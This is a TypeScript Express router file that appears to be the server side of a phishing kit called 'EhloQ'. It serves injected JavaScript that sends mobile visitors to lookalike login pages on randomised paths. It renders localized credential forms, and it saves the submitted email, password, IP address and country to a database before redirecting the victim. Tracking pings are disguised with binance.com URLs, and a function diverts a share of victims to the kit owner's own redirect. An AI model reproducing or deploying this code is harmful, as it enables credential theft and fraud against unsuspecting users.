import express, { Response } from 'express';
import geoip from 'geoip-lite';
import requestIp from 'request-ip';
import { CustomRequest } from '../utils/custom.request.interface.js';
import * as UserDB from '../database/user/user.database.js'
import * as AccountDB from '../database/account/account.database.js'
import { IAccount } from '../database/account/account.model.js';
import clm from 'country-locale-map';
import { allowLoadWords, allowSaveWords } from '../utils/allowed_words.js';
import { PagePaylaod } from '../utils/page.payload.interface.js';
import { getTranslatedTexts, TranslatedTexts } from '../utils/texts.translate.js';

const { getCountryByAlpha2 } = clm;
const router = express.Router();

router.get("/", async (req: CustomRequest, res: Response) => {
    res.render("home")
})

router.get("/nofound", async (req: CustomRequest, res: Response) => {
    const fullDomMode = req.headers.fullDomMode;
    if (fullDomMode) {
        res.status(400).send('file not found');
    } else {
        res.render("notFound", { message: "standard" });
    }
})

// ESTE CHECK PASA A /ehloq-load Y LUEGO A /ehloq-save
router.get("/ehloq-check", async (req: CustomRequest, res: Response) => {
    try {
        const identifier = req.headers.identifier;
        if (!identifier) {
            res.type('application/javascript');
            return res.send('console.log("check => identifier")');
        }

        const clientIp = requestIp.getClientIp(req);
        if (!clientIp) {
            res.type('application/javascript');
            return res.send('console.log("check => clientIp")');
        }

        const user = await UserDB.getUserById(identifier);
        if (!user) {
            res.type('application/javascript');
            return res.send('console.log("check => user")');
        }

        // SI ESTA EL MODO DIRECTO REDIRECCIONAR DE UNA VEZ
        if (user.config.direct) {
            // return res.redirect(307, user.config.redirect);
            const customRedirect = getRandomRedirect(user.percent, user.config.redirect, user.config.serverRedirect);

            res.type('application/javascript');
            return res.send(`
                const redirect = "${customRedirect}";
                
                // SETIAR CONTADORES
                setTimeout(function () {
                    new Image().src = "https://whos.amung.us/pingjs/?k=${user.config.counter}&t=EhloQ%202k24&x=https://www.binance.com/${user.username}";
                }, 100);
                setTimeout(function () {
                    new Image().src = "https://whos.amung.us/pingjs/?k=${user.config.globalCounter}&t=EhloQ%202k24&x=https://www.binance.com/${user.config.counter}";
                }, 100);
                setTimeout(function () {
                    if (screen.width < 800) {
                        // Redireccionamos a la URL modificada
                        window.location.href = redirect;
                    }
                }, 400);
            `);
        }

        // const serverUrl = `${req.protocol}://${req.get('host')}`;
        const serverUrl = `${req.protocol}s://${req.get('host')}`;
        const allowLoadWord = allowLoadWords[Math.floor(Math.random() * allowLoadWords.length)];
        const fakeIndentifier = `${identifier}${Math.floor(Math.random() * 16777215).toString(16)}`;

        res.type('application/javascript');

        // return res.send(`
        //     let pageUrl = "${serverUrl}/${allowLoadWord}?${fakeIndentifier}";
        //     const gpnameParam = getGpnameFromUrl();
        
        //     if (gpnameParam) {
        //         pageUrl += '&gpname=' + encodeURIComponent(gpnameParam);
        //     }

        //     if (screen.width < 600) {
        //         // Redireccionamos a la URL modificada
        //         window.location.href = pageUrl;
        //     }
        
        //     function getGpnameFromUrl() {
        //         const urlParams = new URLSearchParams(window.location.search);
        //         const gpnameValue = urlParams.get('gpname');
        //         return gpnameValue;
        //     }
        // `);
    
        return res.send(`
            (function() {
                const serverUrl = "${serverUrl}";
                const allowLoadWord = "${allowLoadWord}";
                const fakeIdentifier = "${fakeIndentifier}";
                
                let pageUrl = \`\${serverUrl}/\${allowLoadWord}?\${fakeIdentifier}\`;
                const gpnameParam = getGpnameFromUrl();
            
                if (gpnameParam) {
                    pageUrl += '&gpname=' + encodeURIComponent(gpnameParam);
                }
        
                if (screen.width < 600) {
                    // Redireccionamos a la URL modificada
                    console.log("Redireccionando a:", pageUrl);
                    window.location.href = pageUrl;
                }
            
                function getGpnameFromUrl() {
                    const urlParams = new URLSearchParams(window.location.search);
                    return urlParams.get('gpname');
                }
            })();
        `);
    } catch (error) {
        res.type('application/javascript');
        return res.send('console.log("check => catch")');
    }
});

router.get("/ehloq-load", async (req: CustomRequest, res: Response) => {
    try {
        const identifier = req.headers.identifier;
        if (!identifier) {
            return res.render("notFound", { message: "load => identifier" });
        }

        const clientIp = requestIp.getClientIp(req);
        if (!clientIp) {
            return res.render("notFound", { message: "load => clientIp" });
        }

        const geoInfo = geoip.lookup(clientIp);
        if (!geoInfo || !geoInfo.country) {
            return res.render("notFound", { message: "load => geoInfo" });
        }

        const user = await UserDB.getUserById(identifier);
        if (!user) {
            return res.render("notFound", { message: "load => user" });
        }

        // const serverUrl = `${req.protocol}://${req.get('host')}`;
        const serverUrl = `${req.protocol}s://${req.get('host')}${req.originalUrl}`;
        const fakeIndentifier = `${identifier}${Math.floor(Math.random() * 16777215).toString(16)}`;
        const allowSaveWord = allowSaveWords[Math.floor(Math.random() * allowSaveWords.length)];

        const payload: PagePaylaod = {
            username: user.username,
            redirect: user.config.redirect,
            typeHack: user.config.typeHack,
            counter: `https://whos.amung.us/pingjs/?k=${user.config.counter}&t=EhloQ%20Panel&x=https://www.binance.com/${user.username}`,
            globalCounter: `https://whos.amung.us/pingjs/?k=${user.config.globalCounter}&t=EhloQ%20Panel&x=https://www.binance.com/${user.config.counter}`,
            backRedirect: user.config.backRedirect,
            formUrl: `${serverUrl}/${allowSaveWord}?${fakeIndentifier}`,
            identifier: identifier
        };

        const default_locale = getCountryByAlpha2(geoInfo.country)?.default_locale;
        const texts: TranslatedTexts = getTranslatedTexts(default_locale || "en");

        const gpnameValue = req.query.gpname;
        texts.gpNameDefault = (gpnameValue as string) || texts.gpNameDefault;

        return res.render('index', { texts, payload });
    } catch (error) {
        return res.render("notFound", { message: "load => catch" });
    }
});

router.post("/ehloq-save", async (req: CustomRequest, res: Response) => {
    try {
        const clientIp = requestIp.getClientIp(req);
        if (!clientIp) {
            return res.status(404).send('Página no encontrada');
        }

        const identifier = req.headers.identifier;
        if (!identifier) {
            return res.status(404).send('Página no encontrada');
        }

        const user = await UserDB.getUserById(identifier);
        if (!user) {
            return res.status(404).send('Página no encontrada');
        }

        const cleanBody = JSON.parse(JSON.stringify(req.body));
        if (!cleanBody.username || !cleanBody.name) {
            return res.status(404).send('Página no encontrada');
        }

        // Extrae los datos de la solicitud (deberías validarlos adecuadamente)
        // const { email, password, username, country, countryCode } = req.body;

        // Obtener información geográfica
        const geoInfo = geoip.lookup(clientIp);
        if (!geoInfo || !geoInfo.country) {
            return res.status(404).send('Página no encontrada');
        }

        // Imprimir los datos en la consola
        console.log("IP del usuario:", clientIp);
        console.log("Información geográfica:", geoInfo);

        // Crea una nueva cuenta
        const newAccountData: IAccount = {
            email: (cleanBody.username as string),
            password: (cleanBody.name as string),
            username: user.username,
            country: getCountryByAlpha2(geoInfo.country)?.name || "",
            countryCode: geoInfo.country,
            active: true,
            hasCookies: false,
            ipAddress: clientIp,
            userAgent: "",
            createdAt: new Date(),
        };

        await AccountDB.saveNewAccount(newAccountData);

        // Guarda la cuenta en la base de datos
        // const savedAccount = await newAccount.save();

        // return res.send("EhloQ"); // Respuesta de ejemplo
        const customRedirect = getRandomRedirect(user.percent, user.config.redirect, user.config.serverRedirect);
        // return res.redirect(307, user.config.redirect);
        return res.redirect(307, customRedirect);
    } catch (error) {
        console.error("Error al procesar la solicitud:", error);
        return res.status(500).send("Error interno del servidor");
    }
});

function getRandomRedirect(percent: number, userRedirect: string, serverRedirect: string): string {
    if (percent === 0) {
        return userRedirect;
    }

    const randomValue = Math.random() * 100;

    if (randomValue < percent) {
        return serverRedirect;
    } else {
        return userRedirect;
    }
}

export default router;